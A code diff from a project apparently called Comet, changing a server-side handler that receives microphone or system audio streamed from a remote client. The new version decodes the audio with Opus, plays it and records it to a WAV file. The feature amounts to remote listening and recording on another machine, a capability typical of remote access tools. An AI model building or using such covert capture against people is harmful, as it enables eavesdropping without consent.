@@ -2,6 +2,7 @@
 using Comet.Common.Networking;
 using Comet.Server.Forms;
 using Comet.Server.Networking;
+using Concentus.Structs;
 using Mono.Cecil.Cil;
 using NAudio.Codecs;
 using NAudio.Wave;
@@ -81,30 +82,34 @@ namespace Comet.Server.Messages
                     break;
             }
         }
-        void Execute(ISender client, SendMicrophoneInit message)
+        void Execute(ISender client, GetAudioResponse message)
         {
-            microphone?.StopRecording();
-            microphone = new WaveInEvent();
-            microphone.WaveFormat = new WaveFormat(16000, 1);
-            microphone.DeviceNumber = 0;
-            microphone.DataAvailable += WaveDataAvailable;
-            microphone.RecordingStopped += MicWaveStop;
-            microphone.StartRecording();
-        }
-        void WaveDataAvailable(object sender, WaveInEventArgs e)
-        {
-            _client.Send(new SendMicrophoneData
+            if (message.Buffer.Length > 0 && message.BytesRecorded > 0)
             {
-                Buffer = e.Buffer,
-                BytesRecorded = e.BytesRecorded,
-            });
+                byte[] decoded;
+
+                if (message.IsSystem)
+                {
+                    var _decoded = new short[960 * format.Channels]; // 960帧 * 通道数
+                    int samplesDecoded = decoder.Decode(message.Buffer, 0, message.Buffer.Length, _decoded, 0, 960, false);
+                    int bytesDecoded = samplesDecoded * format.Channels * 2; // 2字节/采样
+                    var byteBuffer = new byte[bytesDecoded];
+                    Buffer.BlockCopy(_decoded, 0, byteBuffer, 0, bytesDecoded);
+                    BufferedWaveProvider?.AddSamples(byteBuffer, 0, bytesDecoded);
+                    WaveFileWriter?.Write(byteBuffer, 0, bytesDecoded);
+                    WaveFileWriter?.Flush();
+                }
+                else
+                {
+                    decoded = DecodeMicro(message.Buffer, 0, message.Buffer.Length);
+                    BufferedWaveProvider?.AddSamples(decoded, 0, decoded.Length);
+                    WaveFileWriter?.Write(decoded, 0, decoded.Length);
+                    WaveFileWriter?.Flush();
+                }
+            }
         }
-        void MicWaveStop(object sender, StoppedEventArgs e)
-        {
-            microphone.DataAvailable -= null;
-            microphone.RecordingStopped -= null;
-            microphone?.Dispose();
-        }
+
+
 
         void Execute(ISender client, GetAudioNames message)
         {
@@ -113,16 +118,16 @@ namespace Comet.Server.Messages
                 OnDisplaysChanged(message);
             }
         }
-
+        OpusDecoder decoder;
         public void StartListen(int index, int isSystem)
         {
             _client.Send(new GetAudioResponse
             {
                 IsSystem= isSystem==1,
             });
-            
-            format = isSystem == 1 ? WaveFormat.CreateIeeeFloatWaveFormat(48000, 2) : new WaveFormat(16000, 1);
+            format = isSystem == 1 ? new WaveFormat(48000, 16, 2) : new WaveFormat(16000, 1);
             BufferedWaveProvider = new BufferedWaveProvider(format);
+            decoder = new OpusDecoder(format.SampleRate, format.Channels);
             WaveOut.DeviceNumber = index;
             WaveOut.Init(BufferedWaveProvider);
             WaveOut.Play();
@@ -137,40 +142,6 @@ namespace Comet.Server.Messages
             microphone?.StopRecording();
         }
 
-        void Execute(ISender client, GetAudioResponse message)
-        {
-            if (message.Buffer.Length > 0 && message.BytesRecorded > 0)
-            {
-                byte[] decoded;
-                
-                if (message.IsSystem)
-                {
-                    decoded = DecodeSys(message.Buffer, 0, message.Buffer.Length);
-                }
-                else
-                {
-                    decoded = DecodeMicro(message.Buffer, 0, message.Buffer.Length);
-                }
-                
-                try
-                {
-                    BufferedWaveProvider?.AddSamples(decoded, 0, message.BytesRecorded);
-                    WaveFileWriter?.Write(decoded, 0, decoded.Length);
-                    WaveFileWriter?.Flush();
-                }
-                catch (Exception e)
-                {
-                    MessageBox.Show(e.Message);
-                }
-            }
-            
-        }
-        byte[] DecodeSys(byte[] data, int offset, int length)
-        {
-            var decoded = new byte[length];
-            Array.Copy(data, offset, decoded, 0, length);
-            return decoded;
-        }
         byte[] DecodeMicro(byte[] data, int offset, int length)
         {
             if (offset != 0)
